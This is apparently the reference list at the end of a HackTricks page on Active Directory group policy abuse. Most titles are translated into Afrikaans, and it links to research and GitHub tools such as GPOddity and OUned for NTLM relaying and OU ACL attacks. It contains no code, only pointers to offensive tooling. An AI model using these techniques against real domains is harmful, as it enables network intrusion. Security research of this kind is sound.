- [12] [GPOddity: uitbuiting van Active Directory GPOs deur NTLM relaying, en meer](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU having a laugh? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: uitbuiting van verborge Organizational Units ACL attack vectors in Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Simulering van wettige Active Directory-dienste op die netwerk: die geval van GPO exploitation](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
{{#include ../../../banners/hacktricks-training.md}}
